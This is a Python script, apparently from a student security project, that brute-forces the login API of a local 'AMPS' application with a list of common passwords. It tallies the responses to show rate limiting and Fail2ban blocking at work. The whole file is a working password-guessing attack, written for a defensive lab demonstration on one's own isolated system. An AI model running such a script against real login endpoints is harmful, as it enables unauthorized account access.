#!/usr/bin/env python3
"""
Demo de brute-force contra o login do AMPS (Projeto Final de Segurança — RA3).

Mesma técnica do M3b da Atividade 05 (Ethical Hacking), adaptada à API JSON do AMPS:
envia um usuário fixo + muitas senhas e observa a resposta. Serve para demonstrar as
defesas: rate limiting (429) e a detecção/bloqueio pelo Fail2ban (lê logs/seguranca.log).

ÉTICA: aponte SOMENTE para o seu próprio AMPS local, em ambiente isolado.

Uso:
  python3 demo-brute.py --url https://localhost:8443/auth/login \\
      --email teste@demo.local --cacert ../tls/out/ca.crt -n 30
"""
import argparse
import sys
import time

import requests

SENHAS_FALSAS = [
    "123456", "senha", "admin", "qwerty", "root", "letmein", "password",
    "abc123", "111111", "123123", "iloveyou", "000000", "sunshine",
]


def main():
    ap = argparse.ArgumentParser(description="Brute-force demo contra o login do AMPS.")
    ap.add_argument("--url", default="https://localhost:8443/auth/login")
    ap.add_argument("--email", default="teste@demo.local")
    ap.add_argument("--cacert", default="../tls/out/ca.crt", help="CA para validar o TLS")
    ap.add_argument("-n", "--tentativas", type=int, default=30)
    ap.add_argument("--delay", type=float, default=0.0)
    args = ap.parse_args()

    print(f"[*] Atacando {args.url} (usuário {args.email}) — {args.tentativas} tentativas")
    contagem = {}
    inicio = time.time()
    for i in range(1, args.tentativas + 1):
        senha = SENHAS_FALSAS[(i - 1) % len(SENHAS_FALSAS)]
        try:
            r = requests.post(args.url, json={"email": args.email, "senha": senha},
                              verify=args.cacert, timeout=5)
            code = r.status_code
        except requests.RequestException as e:
            code = f"ERRO({e.__class__.__name__})"
        contagem[code] = contagem.get(code, 0) + 1
        marca = ""
        if code == 429:
            marca = "  <- rate limit"
        elif isinstance(code, str) and code.startswith("ERRO"):
            marca = "  <- bloqueado (conexao recusada? Fail2ban?)"
        print(f"  tentativa {i:>3}: {code}{marca}")
        if args.delay:
            time.sleep(args.delay)

    dt = time.time() - inicio
    print(f"\n[*] Resumo em {dt:.1f}s: " +
          ", ".join(f"{k}={v}" for k, v in sorted(contagem.items(), key=lambda x: str(x[0]))))
    print("[*] Veja o log: logs/seguranca.log  ·  ban: sudo fail2ban-client status amps-auth")
    return 0


if __name__ == "__main__":
    sys.exit(main())
